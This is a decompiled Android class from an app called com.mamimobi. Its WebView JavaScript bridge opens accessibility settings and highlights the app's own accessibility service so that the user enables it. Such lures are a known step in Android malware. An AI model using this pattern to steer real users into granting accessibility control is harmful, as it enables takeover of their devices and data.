package defpackage;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.webkit.JavascriptInterface;
import com.mamimobi.AccessService;
import com.mamimobi.activity.NavigatorSettingActivity;

/* JADX INFO: loaded from: classes.dex */
public final class jh0 {
    public final /* synthetic */ NavigatorSettingActivity a;

    public jh0(NavigatorSettingActivity navigatorSettingActivity) {
        this.a = navigatorSettingActivity;
    }

    @JavascriptInterface
    public void returnResult() {
        NavigatorSettingActivity navigatorSettingActivity = this.a;
        try {
            Intent intent = new Intent("com.samsung.accessibility.installed_service");
            if (intent.resolveActivity(navigatorSettingActivity.getPackageManager()) == null) {
                intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                if (intent.resolveActivity(navigatorSettingActivity.getPackageManager()) == null) {
                    intent.putExtra("android.intent.extra.COMPONENT_NAME", new ComponentName(NavigatorSettingActivity.E, (Class<?>) AccessService.class));
                    intent.setFlags(268435456);
                    intent.addFlags(32768);
                    intent.addFlags(536870912);
                    intent.addFlags(1073741824);
                    navigatorSettingActivity.startActivity(intent);
                    return;
                }
            }
            intent.addFlags(268435456);
            intent.addFlags(32768);
            intent.addFlags(536870912);
            intent.addFlags(1073741824);
            String str = navigatorSettingActivity.getPackageName() + "/" + AccessService.class.getName();
            Bundle bundle = new Bundle();
            bundle.putString(":settings:fragment_args_key", str);
            intent.putExtra(":settings:fragment_args_key", str);
            intent.putExtra(":settings:show_fragment_args", bundle);
            navigatorSettingActivity.startActivity(intent);
        } catch (Exception unused) {
        }
    }
}
